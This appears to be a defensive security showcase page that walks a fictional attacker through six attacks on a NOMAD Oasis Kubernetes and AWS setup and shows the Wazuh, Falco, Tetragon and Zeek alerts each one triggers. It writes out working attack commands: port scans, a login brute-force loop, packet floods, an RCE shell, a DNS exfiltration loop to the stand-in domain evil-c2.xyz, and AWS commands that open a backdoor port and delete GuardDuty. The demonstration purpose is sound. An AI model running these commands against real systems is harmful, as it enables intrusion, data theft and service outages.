nmap — The Door Knocker

Reconnaissance · Port Scan · OS Fingerprinting
The Attack

John starts attacking from outside. Imagine your building has 65,000 doors. John stands outside and knocks on every single one as fast as he can, trying to find which ones open. He also sends a weird knock that only hackers use — a packet with both SYN and FIN flags at the same time. No normal visitor ever does that.

Attack Command
pentest-netshoot — kubectl exec
attacker@pentest-netshoot:~$ nmap -sS -O 10.30.11.49
Starting Nmap 7.98 at 2026-06-09 21:03 UTC PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address scanned in 12.45 seconds
Wazuh Detects
Nmap OS Detection Probe — SYN+FIN packet, window:1024 — Rule 100500 · Level 12
Port Scan Detected — 20+ SYN packets in 5s · src 10.30.11.127 → dst 10.30.11.49 — Rule 100500 · Level 12
Wazuh Dashboard
Port Scan Detected · Rule 100500 · Severity 2
If He Gets In

He finds an open port and gets a foothold inside a pod. He starts mapping every service, every version number, every reachable IP. He builds a list of known vulnerabilities matching what he found — and picks his next target.

Business Impact
Attacker has a full map of your internal services — reconnaissance is step one of every real attack.
Exposed service versions can be matched against public CVE databases — John now has a shopping list.
If the scan goes unnoticed, the next alert is a compromise — not just a probe.

Directory Busting — The Corridor Crawler

Web Enumeration · HTTP Brute Force · Credential Theft
The Attack

John found the NOMAD Oasis web application. He runs a tool that fires hundreds of HTTP requests per second, each guessing a different hidden URL: /admin, /api/keys, /backup.zip, /.env, /config... He's trying every door on every floor hoping one was left unlocked. He then hammers /login with credential combinations until something works.

Attack Command
pentest-netshoot — kubectl exec
attacker@pentest-netshoot:~$ gobuster dir -u http://10.30.11.49 -w common.txt -t 50
/admin (Status: 403) /login (Status: 200) <-- found /api/v1 (Status: 200) <-- found
attacker@pentest-netshoot:~$ for i in $(seq 1 20); do curl -s -X POST http://10.30.11.49/login -d "user=admin&pass=test$i" & done; wait
Wazuh Detects
HTTP Login Brute Force — 10+ POST /login in 30s · src 10.30.11.127 → dst 10.30.11.49 — Rule 100500 · Level 12
Wazuh Dashboard
HTTP Login Brute Force · Rule 100500 · POST /login · Severity 2
If He Gets In

He finds an exposed API endpoint without authentication. He downloads all scientific datasets stored in NOMAD Oasis without a password, and searches the responses for API keys or credentials accidentally left in a config file.

Business Impact
Years of proprietary research data stolen in minutes.
If credentials are found in an exposed config, the entire cluster is at risk.
GDPR violation if personal data was in those datasets — regulatory fines follow.

DDoS — The Mob at the Door

SYN Flood · UDP Flood · ICMP Flood · Denial of Service
The Attack

This time John doesn't want to sneak in — he just wants to break things. He rents a botnet of thousands of infected computers and tells all of them to flood your servers at once. Three waves hit simultaneously: a SYN flood that fills your server's memory with half-open connections, a UDP flood that wastes all its CPU, and an ICMP flood that saturates the network pipe entirely.

Attack Commands
pentest-netshoot — kubectl exec
attacker@pentest-netshoot:~$ nping --tcp -p 80 --flood --count 2000 10.30.11.49
Sent 2000 packets in 0.43 seconds | 4651.16 pkts/sec
attacker@pentest-netshoot:~$ nping --udp -p 53 --flood --count 2000 10.30.11.49
Sent 2000 packets in 0.39 seconds | 5128.21 pkts/sec
attacker@pentest-netshoot:~$ nping --icmp --flood --count 1000 10.30.11.49
Sent 1000 packets in 0.21 seconds | 4761.90 pkts/sec
Wazuh Detects — All Three Simultaneously

UDP Flood DDoS — 1000+ UDP/5s · port 53 · src 10.30.11.127 — Rule 100500 · Level 12 · Severity 1

The Impact — No Break-In Needed

A DDoS doesn't need to get inside. The goal is simply to make everything unavailable. Scientists can't access their data. Uploads fail. The platform goes offline completely. And while your team is responding to the flood — John's real attack may be happening somewhere else, quietly.

Business Impact
Full service outage — NOMAD Oasis is unreachable for all users.
AWS data transfer costs spike massively absorbing the flood traffic.
DDoS is often a smokescreen — the real attack happens while your team is distracted.

Container Shell Spawn — The Ghost Inside

Runtime Detection · Falco · Tetragon eBPF Enforcement
The Attack

John exploits a vulnerability in the NOMAD web application and gets remote code execution. He opens an interactive shell inside the running container — like finding a hidden hatch inside one of the rooms and climbing through it. From there he tries to run nmap to scan the internal network and plan his next move.

Attack Command
john@attacker — remote exploit shell
john@attacker:~$ curl -s http://10.30.11.49/api/rce --data "cmd=bash -i"
root@nomad-oasis-app:/#
root@nomad-oasis-app:/# nmap -sS 10.30.10.0/24
Killed

Tetragon Detects — Rules 100702 & 100700 · Level 11–14
Shell spawned in container — binary=/usr/bin/bash · pod nomad-oasis/nomad-oasis-app — Rule 100702 · Level 11
Malicious tool execution blocked SIGKILL — binary=/usr/bin/nmap · killed before first packet sent — Rule 100700 · Level 14
Wazuh Dashboard — Security Events
Falco · Rule 100600 · Level 13 — Terminal shell in container
Tetragon · Rule 100702 · Level 11 — Shell spawned in container
Tetragon · Rule 100700 · Level 14 — nmap blocked with SIGKILL
If He Gets Further

With a shell inside the pod, John can read application secrets, environment variables, and mounted files. He can try to escalate privileges by calling nsenter or setuid to break out of the container entirely and reach the underlying node. Tetragon watches every syscall and fires a privilege escalation alert the instant he tries.

Business Impact
Application secrets and database credentials read directly from container memory.
Container escape gives access to the underlying EKS node and every other pod on it.
Even if nmap is killed instantly by Tetragon, the shell itself is the foothold for everything else.

DNS Exfiltration — The Whispering Thief

Data Exfiltration · Zeek Network Monitoring · MISP Intel
The Attack

John is inside a pod and has stolen research data, but every direct connection to the internet is blocked by Cilium. So he gets clever. He encodes the stolen data in base64, splits it into tiny chunks, and hides each piece inside a DNS query — like smuggling letters out of a building by writing them on the back of postcards. DNS looks like normal web traffic, so it often slips through.

Attack Command
root@nomad-oasis-app — inside compromised pod
root@nomad-oasis-app:/# cat research_data.zip | base64 | fold -w 30 | while read chunk; do
> dig ${chunk}.exfil.evil-c2.xyz; done
; <<>> DiG <<>> aGVsbG8gd29ybGQ.exfil.evil-c2.xyz ; <<>> DiG <<>> dGhpcyBpcyBzdG9s.exfil.evil-c2.xyz ; <<>> DiG <<>> ZW4gcmVzZWFyY2g.exfil.evil-c2.xyz
Zeek Detects — Rules 100700 & 100701 · Level 8–13
Zeek Notice — DNS exfiltration pattern — hundreds of queries to *.exfil.evil-c2.xyz in seconds — Rule 100701 · Level 8
Zeek Intel hit — MISP IOC match — evil-c2.xyz matches threat intel feed · indicator_type=domain — Rule 100700 · Level 13
Wazuh Dashboard — Security Events
Zeek · Rule 100701 · Level 8/13 — DNS Tunneling + MISP Intel hit
If He Gets the Data Out

John now has a copy of years of scientific research on his machine. The data left the building through a channel that looked like normal web traffic. Without Zeek watching DNS at this level of detail, the exfiltration would be invisible.

Business Impact
Intellectual property stolen through a channel most firewalls don't inspect.
If the C2 domain is in MISP's threat feed, Zeek flags the match in real time — even before the data leaves.
Regulatory breach — data exfiltration triggers mandatory GDPR notification within 72 hours.

Cloud Backdoor — The Invisible Admin

AWS CloudTrail · IAM Abuse · Security Group Tampering
The Attack

John doesn't touch the application at all this time. He found leaked AWS credentials and goes straight to the AWS control panel. First he opens a secret backdoor port in the firewall so he can connect directly to any server. Then he checks which IAM roles have admin access — and tries to disable GuardDuty so AWS stops watching him.

Attack Commands
john@attacker — AWS CLI with stolen credentials
john@attacker:~$ aws ec2 authorize-security-group-ingress --group-id sg-0750d7d810abeabb4 --protocol tcp --port 31337 --cidr 0.0.0.0/0
{}
john@attacker:~$ aws iam list-attached-role-policies --role-name github-runner-role
AdministratorAccess <-- full AWS admin via CI/CD pipeline
john@attacker:~$ aws guardduty delete-detector --detector-id abc123def456
{}
Wazuh CloudTrail Detects — Multiple Rules Fire
Security Group modified — port 31337 opened to 0.0.0.0/0 · not by CI pipeline — Rule 100302 · Level 8
Security detection plane disabled — GuardDuty DeleteDetector · not by CI pipeline — Rule 100307 · Level 13
IAM role or policy enumerated — ListAttachedRolePolicies on github-runner-role — Rule 100303 · Level 10
Wazuh Dashboard — Security Events
CloudTrail · Rule 100302 · Level 8 — Security Group backdoor port 31337
CloudTrail · Rule 100307 · Level 13 — GuardDuty disabled
CloudTrail · Rule 100303 · Level 10 — IAM enum revealed AdministratorAccess
If He Completes This

John now has a permanent backdoor into the infrastructure that survives container restarts and redeployments. With github-runner-role having full AdministratorAccess, he can inject malicious code into the CI/CD pipeline and ship it to every deployment — a supply chain attack from the inside.

Business Impact
Backdoor port survives indefinitely — John can reconnect any time without needing credentials again.
With admin access via the CI/CD pipeline, every future deployment could contain malicious code.
Disabling GuardDuty removes AWS's own threat detection — the attacker goes dark at the cloud layer.
